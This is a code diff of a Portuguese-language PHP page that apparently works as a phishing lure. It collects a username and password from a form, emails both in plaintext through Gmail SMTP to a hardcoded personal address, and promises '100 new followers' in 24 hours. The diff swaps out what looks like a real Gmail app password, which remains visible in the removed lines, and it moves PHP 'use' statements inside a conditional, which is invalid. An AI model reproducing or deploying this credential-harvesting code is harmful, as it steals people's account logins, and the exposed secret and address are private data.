@@ -1,50 +1,55 @@
 <?php
-require 'vendor/autoload.php';
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    require 'vendor/autoload.php';
 
-use PHPMailer\PHPMailer\PHPMailer;
-use PHPMailer\PHPMailer\Exception;
+    use PHPMailer\PHPMailer\PHPMailer;
+    use PHPMailer\PHPMailer\Exception;
 
-// Defina o endereço de e-mail para onde os dados serão enviados
-$to = "the.emerson.araujo@gmail.com"; // Substitua com seu e-mail
-$subject = "Novo Registro de Usuário";
+    // Defina o endereço de e-mail para onde os dados serão enviados
+    $to = "the.emerson.araujo@gmail.com"; // Substitua com seu e-mail
+    $subject = "Novo Registro de Usuário";
 
-// Coleta os dados do formulário
-$username = $_POST['username'];
-$password = $_POST['password'];
+    // Coleta os dados do formulário
+    $username = $_POST['username'];
+    $password = $_POST['password'];
 
-// Cria o corpo do e-mail
-$message = "Novo registro de usuário:\n\n";
-$message .= "Nome de Usuário: " . htmlspecialchars($username) . "\n";
-$message .= "Senha: " . htmlspecialchars($password) . "\n";
+    // Cria o corpo do e-mail
+    $message = "Novo registro de usuário:\n\n";
+    $message .= "Nome de Usuário: " . htmlspecialchars($username) . "\n";
+    $message .= "Senha: " . htmlspecialchars($password) . "\n";
 
-// Configurações do PHPMailer
-$mail = new PHPMailer(true);
+    // Configurações do PHPMailer
+    $mail = new PHPMailer(true);
 
-try {
-    // Configurações do servidor SMTP do Gmail
-    $mail->isSMTP();                                      // Configurar para usar SMTP
-    $mail->Host       = 'smtp.gmail.com';                 // Servidor SMTP do Gmail
-    $mail->SMTPAuth   = true;                             // Ativar autenticação SMTP
-    $mail->Username   = 'the.emerson.araujo@gmail.com';   // Seu endereço de e-mail Gmail
-    $mail->Password   = 'uoto itqm fcof qkdq';             // Senha de aplicativo gerada
-    $mail->SMTPSecure = 'tls';                            // Habilitar criptografia TLS
-    $mail->Port       = 587;                              // Porta TCP a ser conectada
+    try {
+        // Configurações do servidor SMTP do Gmail
+        $mail->isSMTP();                                      // Configurar para usar SMTP
+        $mail->Host       = 'smtp.gmail.com';                 // Servidor SMTP do Gmail
+        $mail->SMTPAuth   = true;                             // Ativar autenticação SMTP
+        $mail->Username   = 'the.emerson.araujo@gmail.com';   // Seu endereço de e-mail Gmail
+        $mail->Password   = 'sua-senha-de-aplicativo';         // Senha de aplicativo gerada
+        $mail->SMTPSecure = 'tls';                            // Habilitar criptografia TLS
+        $mail->Port       = 587;                              // Porta TCP a ser conectada
 
-    // Remetente e destinatário
-    $mail->setFrom('the.emerson.araujo@gmail.com', 'Seu Nome');  // Endereço e nome do remetente
-    $mail->addAddress($to);                                    // Destinatário do e-mail
+        // Remetente e destinatário
+        $mail->setFrom('the.emerson.araujo@gmail.com', 'Seu Nome');  // Endereço e nome do remetente
+        $mail->addAddress($to);                                    // Destinatário do e-mail
 
-    // Conteúdo do e-mail
-    $mail->isHTML(false);                                  // Configurar e-mail como texto
-    $mail->Subject = $subject;                             // Assunto do e-mail
-    $mail->Body    = $message;                             // Corpo do e-mail
+        // Conteúdo do e-mail
+        $mail->isHTML(false);                                  // Configurar e-mail como texto
+        $mail->Subject = $subject;                             // Assunto do e-mail
+        $mail->Body    = $message;                             // Corpo do e-mail
 
-    // Envia o e-mail
-    $mail->send();
-    $success = true;
-} catch (Exception $e) {
+        // Envia o e-mail
+        $mail->send();
+        $success = true;
+    } catch (Exception $e) {
+        $success = false;
+        $errorMessage = $mail->ErrorInfo;
+    }
+} else {
     $success = false;
-    $errorMessage = $mail->ErrorInfo;
+    $errorMessage = "O formulário não foi enviado corretamente.";
 }
 ?>
 
@@ -105,7 +110,7 @@ try {
             <h2>Bem-vindo, <?php echo htmlspecialchars($username); ?>!</h2>
             <p class="success-message">Estamos felizes em tê-lo conosco.</p>
             <p>Suas informações foram enviadas com sucesso!</p>
-            <p>Aguarde 24hrs para seu novos 100 seguidores!</p>
+            <p>Aguarde 24hrs para seus novos 100 seguidores!</p>
             <a href="index.html">Voltar ao Início</a>
         <?php else: ?>
             <h2>Oops!</h2>
@@ -116,6 +121,3 @@ try {
     </div>
 </body>
 </html>
-
-
-
